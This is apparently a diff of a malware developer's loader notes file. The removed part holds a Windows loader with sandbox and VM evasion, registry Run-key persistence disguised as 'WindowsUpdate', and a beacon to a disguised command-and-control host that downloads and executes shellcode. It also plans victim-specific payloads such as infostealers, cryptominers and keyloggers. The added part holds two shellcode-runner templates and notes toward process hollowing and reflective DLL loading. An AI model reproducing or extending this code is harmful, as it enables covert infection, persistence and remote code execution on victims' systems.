@@ -1,207 +1,94 @@
-class Loader {
-    void main() {
-        // 1. Check if less than 2GB RAM (sandbox)
-        if (getRAM() < 2 * 1024 * 1024 * 1024) return;
-        
-        // 2. Check if recent install (VM)
-        if (getInstallDate() > (now() - 7_days)) return;
-        
-        // 3. Basic registry persistence
-        if (!isPersisted()) {
-            RegSetValue("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
-        }
-        
-        // 4. Call home for real functionality
-        downloadModules();
-    }
-};
 
+//////////////////////////////////////////////////////////////////////////////////////////////
+// Loader #1
 /*
 #include <windows.h>
-#include <wininet.h>
 
-#pragma comment(lib, "wininet.lib")
-#pragma comment(lib, "ntdll.lib")
+#define SCSIZE 4096
+char bPayload[SCSIZE] = "PAYLOAD:";
 
-#define C2_SERVER "https://cdn.legit-site.com/api/health"
-#define INITIAL_SLEEP 86400000  // 24 hours
-
-// Shellcode execution function
-typedef BOOL (*SHELLCODE_MAIN)(LPVOID config);
-
-BOOL ExecuteShellcode(BYTE* shellcode, DWORD size, LPVOID config) {
-    // 1. Allocate executable memory
-    PVOID exec_mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (!exec_mem) return FALSE;
-    
-    // 2. Copy shellcode
-    memcpy(exec_mem, shellcode, size);
-    
-    // 3. Execute
-    SHELLCODE_MAIN shellcode_main = (SHELLCODE_MAIN)exec_mem;
-    BOOL result = shellcode_main(config);
-    
-    // 4. Cleanup
-    VirtualFree(exec_mem, 0, MEM_RELEASE);
-    return result;
+void main() {
+	DWORD dwOldProtect;
+	VirtualProtect(bPayload, SCSIZE, PAGE_EXECUTE_READWRITE, &dwOldProtect);
+	(*(void (*)()) bPayload)();
+	return;
 }
+*/
 
-// Basic persistence
-BOOL EstablishPersistence() {
-    HKEY hKey;
-    TCHAR path[MAX_PATH];
-    GetModuleFileName(NULL, path, MAX_PATH);
-    
-    RegOpenKeyEx(HKEY_CURRENT_USER, 
-                "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
-                0, KEY_WRITE, &hKey);
-    RegSetValueEx(hKey, "WindowsUpdate", 0, REG_SZ, (BYTE*)path, lstrlen(path));
-    RegCloseKey(hKey);
-    
-    return TRUE;
-}
+// Loader #2
+/*
+// AArch64 PE EXE Template for Metasploit Framework
+//
+// -----------------------------------------------------------------------------
+//
+// Compilation Instructions:
+//
+//   Using MSVC on a Windows ARM64 Host:
+//
+//   cl.exe /nologo /O2 /W3 /GS- /D_WIN64 template_aarch64_windows.c /link ^
+//   /subsystem:windows /machine:arm64 /entry:main ^
+//   /out:template_aarch64_windows.exe kernel32.lib
+//
+// -----------------------------------------------------------------------------
 
-// C&C communication
-BYTE* BeaconToC2(DWORD* response_size) {
-    HINTERNET hInternet, hConnect, hRequest;
-    BYTE* response = NULL;
-    DWORD bytes_read, total_bytes = 0;
-    char buffer[4096];
-    
-    hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
-    hConnect = InternetConnectA(hInternet, "cdn.legit-site.com", INTERNET_DEFAULT_HTTPS_PORT, 
-                               NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
-    hRequest = HttpOpenRequestA(hConnect, "GET", "/api/health", NULL, NULL, NULL, 
-                              INTERNET_FLAG_SECURE, 0);
-    
-    if (HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
-        response = malloc(4096);
-        while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytes_read) && bytes_read > 0) {
-            response = realloc(response, total_bytes + bytes_read);
-            memcpy(response + total_bytes, buffer, bytes_read);
-            total_bytes += bytes_read;
-        }
+#define WIN32_LEAN_AND_MEAN
+#include <windows.h>
+#undef WIN32_LEAN_AND_MEAN
+
+#define PAYLOAD_MARKER "PAYLOAD:"
+#define SCSIZE 8192
+
+char payload[SCSIZE] = PAYLOAD_MARKER;
+
+int main(void)
+{
+    void *exec_mem;
+    DWORD old_prot;
+    HANDLE hThread;
+
+    // Stage 1: Allocate a block of memory. We request READWRITE permissions
+    // initially so we can copy our payload into it.
+    exec_mem = VirtualAlloc(NULL, SCSIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (exec_mem == NULL)
+    {
+        // Fail silently if allocation fails.
+        return 1;
     }
-    
-    if (hRequest) InternetCloseHandle(hRequest);
-    if (hConnect) InternetCloseHandle(hConnect);
-    if (hInternet) InternetCloseHandle(hInternet);
-    
-    *response_size = total_bytes;
-    return response;
-}
 
-// Main loader loop
-DWORD WINAPI LoaderMain(LPVOID lpParam) {
-    EstablishPersistence();
-    
-    while (TRUE) {
-        DWORD response_size;
-        BYTE* response = BeaconToC2(&response_size);
-        
-        if (response && response_size > 0) {
-            // Response contains shellcode + config
-            // First 4 bytes = config size, then config, then shellcode
-            DWORD config_size = *(DWORD*)response;
-            BYTE* config_data = response + 4;
-            BYTE* shellcode_data = config_data + config_size;
-            DWORD shellcode_size = response_size - 4 - config_size;
-            
-            ExecuteShellcode(shellcode_data, shellcode_size, config_data);
-        }
-        
-        if (response) free(response);
-        Sleep(INITIAL_SLEEP + (rand() % 3600000)); // 24 hours ± 1 hour
+    // Stage 2: Copy the payload from our data section into the new memory block.
+    // A simple loop is used for maximum compiler compatibility and to avoid
+    // needing extra headers like <string.h> for memcpy.
+    for (int i = 0; i < SCSIZE; i++)
+    {
+        ((char *)exec_mem)[i] = payload[i];
     }
-    
+
+    // Stage 3: Change the memory's protection flags from READWRITE to
+    // EXECUTE_READ.
+    if (VirtualProtect(exec_mem, SCSIZE, PAGE_EXECUTE_READ, &old_prot) == FALSE)
+    {
+        // Fail silently if we cannot make the memory executable.
+        return 1;
+    }
+
+    // Stage 4: Execute the shellcode.
+    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
+    if (hThread)
+    {
+        WaitForSingleObject(hThread, INFINITE);
+        CloseHandle(hThread);
+    }
+    else
+    {
+        // As a fallback in case CreateThread fails, call the shellcode directly.
+        ((void (*)())exec_mem)();
+    }
+
     return 0;
 }
-
-// Entry point
-BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
-    if (dwReason == DLL_PROCESS_ATTACH) {
-        DisableThreadLibraryCalls(hModule);
-        CreateThread(NULL, 0, LoaderMain, NULL, 0, NULL);
-    }
-    return TRUE;
-}
-
 */
 
-/*
-// BAD STRATEGY (detected immediately):
-CoreLoader = Advanced VM Detection → SIGNATURE DETECTED → GAME OVER
-
-// GOOD STRATEGY (evades initial detection):
-CoreLoader = Basic Heuristics → PASSES → Downloads Modules → 
-             Advanced Detection → If VM: Die quietly
-                                  If Real: Deploy payload
-
-
-
-1. Initial Infection
-   ↓
-2. Raw Loader Installed (persistence)
-   ↓  
-3. First Beacon → C&C Profiling
-   ↓
-4. C&C Sends Appropriate Shellcode Modules:
-   - Corporate network → Infostealer + Lateral movement
-   - Home user → Cryptominer + Password stealer
-   - Government → Document collector + Keylogger
-   ↓
-5. Modules Execute → Report Back
-   ↓
-6. C&C Sends Updated Modules as Needed
-
-class ModernApproach {
-    void examples() {
-        // Cobalt Strike Beacon = shellcode
-        // Metasploit Meterpreter = shellcode  
-        // Many APT loaders = shellcode
-        
-        // These prioritize:
-        // - Stealth over development speed
-        // - Operational security over features
-        // - Targeted attacks over mass distribution
-    }
-};
-
-class ShellcodeUseCases {
-    void appropriate() {
-        // Stagers - small initial loaders
-        // Exploit payloads - memory corruption exploits
-        // Fileless attacks - running entirely in memory
-        // Process injection - injecting into existing processes
-    }
-};
-
-               | Mass Malware (Emotet) | Targeted Malware (APT)
----------------|----------------------|------------------------
-Development    | DLLs (fast)          | Shellcode (stealthy)
-Persistence    | File-based           | Memory-only
-Scale          | Thousands of systems | Dozens of systems
-Lifespan       | Months/years         | Days/weeks
-Update Cycle   | Frequent features    | Rare changes
-
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-
-// shell code executer?
-class EmotetDropper {
-    void executeShellcode(std::vector<uint8_t>& shellcode) {
-        // Allocate executable memory
-        void* exec_mem = VirtualAlloc(NULL, shellcode.size(), 
-                                     MEM_COMMIT | MEM_RESERVE, 
-                                     PAGE_EXECUTE_READWRITE);
-        
-        // Copy shellcode
-        memcpy(exec_mem, shellcode.data(), shellcode.size());
-        
-        // Execute
-        ((void(*)())exec_mem)();
-    }
-};
-
-
-
-*/
+// Loader #: 
+// Reflective DLL 
+// Process Hollowing
+// just add a shellcode execution feature in other process memory and get output via named pipe to your beacon and Transfer that to server
